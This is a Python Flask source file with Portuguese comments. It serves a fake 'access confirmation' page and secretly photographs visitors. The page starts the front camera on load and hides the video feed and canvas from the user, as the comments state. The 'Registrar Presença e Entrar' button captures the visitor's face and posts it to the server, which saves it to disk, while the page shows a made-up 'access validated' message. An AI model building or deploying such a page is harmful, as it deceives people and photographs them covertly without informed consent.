import base64
import os
import cv2
import numpy as np
from datetime import datetime  # Importação adicionada para gerar nomes únicos
from flask import Flask, jsonify, request, render_template_string

app = Flask(__name__)

# Interface HTML modificada para esconder o feed de vídeo
HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
    <title>Captura de Foto</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background-color: #f4f4f9; }
        .container { max-width: 500px; margin: 0 auto; padding: 30px; background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        button { padding: 18px 40px; font-size: 20px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; font-weight: bold; margin-top: 15px; width: 100%; box-sizing: border-box; }
        button:hover { background: #0056b3; }
        #status { margin-top: 20px; font-weight: bold; padding: 10px; border-radius: 5px; display: none; }
        .success { color: #155724; background-color: #d4edda; border: 1px solid #c3e6cb; }
        .error { color: #721c24; background-color: #f8d7da; border: 1px solid #f5c6cb; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Confirmação de Acesso</h2>
        <p>Clique no botão abaixo para prosseguir com a validação.</p>
        
        <button id="capture-btn">Registrar Presença e Entrar</button>
        <div id="status"></div>
    </div>

    <!-- Elementos ocultos para o usuário final -->
    <video id="webcam" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('capture-btn');
        const statusDiv = document.getElementById('status');

        // Inicia a câmera em segundo plano
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                video.srcObject = stream;
            } catch (err) {
                console.error("Erro ao acessar a câmera: ", err);
            }
        }

        function showStatus(text, type) {
            statusDiv.innerText = text;
            statusDiv.className = type === 'success' ? 'status success' : 'status error';
            statusDiv.style.display = 'block';
        }

        captureBtn.addEventListener('click', () => {
            if (video.videoWidth === 0 || video.videoHeight === 0) {
                showStatus("Aguarde um instante e tente novamente...", "error");
                return;
            }

            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg');
            
            showStatus("Processando...", "success");

            fetch('/salvar-foto-cliente', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ imagem: imageData })
            })
            .then(response => response.json())
            .then(data => {
                if (data.sucesso) {
                    showStatus("Acesso validado com sucesso!", "success");
                } else {
                    showStatus("Erro na validação: " + data.erro, "error");
                }
            })
            .catch(err => {
                console.error(err);
                showStatus("Erro de conexão.", "error");
            });
        });

        window.addEventListener('load', startCamera);
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/salvar-foto-cliente', methods=['POST'])
def salvar_foto_cliente():
    try:
        dados = request.get_json()
        if not dados or 'imagem' not in dados:
            return jsonify({'sucesso': False, 'erro': 'Nenhum dado de imagem recebido'}), 400

        dados_imagem = dados['imagem']
        if ',' in dados_imagem:
            dados_imagem = dados_imagem.split(',')[1]

        bytes_imagem = base64.b64decode(dados_imagem)
        np_array = np.frombuffer(bytes_imagem, dtype=np.uint8)
        frame = cv2.imdecode(np_array, cv2.IMREAD_COLOR)

        if frame is None:
            return jsonify({'sucesso': False, 'erro': 'Falha ao processar a imagem'}), 400

        # Cria uma pasta chamada 'fotos' se ela ainda não existir
        if not os.path.exists('fotos'):
            os.makedirs('fotos')

        # Gera o nome do arquivo com a data e hora atual (Ex: foto_20241024_153022.jpg)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        nome_arquivo = f"fotos/foto_{timestamp}.jpg"
        
        cv2.imwrite(nome_arquivo, frame)
        return jsonify({'sucesso': True, 'arquivo': nome_arquivo})
        
    except Exception as e:
        return jsonify({'sucesso': False, 'erro': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
